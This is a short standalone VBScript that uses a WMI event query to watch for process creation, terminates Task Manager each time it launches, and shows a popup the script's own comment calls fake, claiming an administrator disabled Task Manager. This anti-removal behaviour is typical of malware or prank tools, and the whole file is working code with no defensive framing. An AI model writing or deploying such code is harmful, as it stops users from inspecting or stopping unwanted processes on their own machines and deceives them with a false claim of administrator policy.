On Error Resume Next
Set objWshShl = WScript.CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//./root/cimv2")
Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * from __instancecreationevent " & " within 1 where TargetInstance isa 'Win32_Process'")
Do
    Set objLatestProcess = colMonitoredProcesses.NextEvent
    If objLatestProcess.TargetInstance.Name = "taskmgr.exe" Then
        objLatestProcess.TargetInstance.Terminate
    ' fake popup message
		objWshShl.Popup "Task Manager has been disabled by your administrator.", 3, "Task Manager", 16
    End If
Loop
